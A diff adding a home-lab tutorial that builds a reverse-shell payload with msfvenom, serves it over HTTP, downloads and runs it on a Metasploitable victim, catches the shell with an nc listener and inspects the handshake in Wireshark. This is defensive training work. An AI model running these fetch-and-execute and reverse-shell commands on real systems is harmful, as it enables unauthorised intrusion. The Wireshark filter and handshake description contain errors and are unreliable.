@@ -1,3 +1,45 @@
 If you want to participate in this exercise, you must install a Kali Linux machine and Metasploitable (as the victim device). I personally use OracleVMware to interact with my virtualized lab environments.
 
 
+Basic Reverse Shell Sniffing (with Wireshark Traffic Analysis)
+
+Step 1: Create Shell.Elf text file (the payload) using msfvenom on kali linux terminal (in attacker machine)
+	In Bash…
+		$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=[INET IP ADDRESS on Kali] LPORT=4444 -f elf -o shell.elf
+
+	*If it works, the terminal will respond as [*] Writing 123 bytes to shell.elf or Saved as: shell.elf
+
+
+Step 2: Make the payload executable (on Kali/ attacker machine)
+	Bash (on Kali)…
+		$ chmod +x shell.elf
+	
+*This will transfer payload to Metasploitable
+
+Bash (on Kali)…
+	$ python3 -m http.server 8080
+
+*this will host your payload
+
+Bash (on Metasploitable)...
+	$ wget http://<Kali IP>:8080/shell.elf
+
+*After typing wget, it should say Connecting [Kali IP Address]...
+
+
+Step 3: Setup Listener on Kali
+	Bash (on Kali)...
+		$ nc -lvnp 4444
+
+	After typing nc listener command, run the payload on Metasploitable using the command below:
+	Bash (on Metasploitable)...
+		$ chmod +x shell.elf && ./shell.elf
+
+
+Results:
+If Metasploitable receives the payload, your nc listener on Kali will say Connection received on [Metasploitable IP ADDRESS]
+	If you were to capture this entire process on Wireshark, you can view the three-way handshake process between Kali Linux and Metasploitable using the Wireshark filters tcp.port==4444 and ip.dist==[Kali Linux IP]. Wireshark captured traffic will show SYN (initiated device), then ACK (destination where victim Metasploitable machine recieved the payload). Results in [SYN]--->[SYN, ACK]--->[ACK]
+
+
+
+
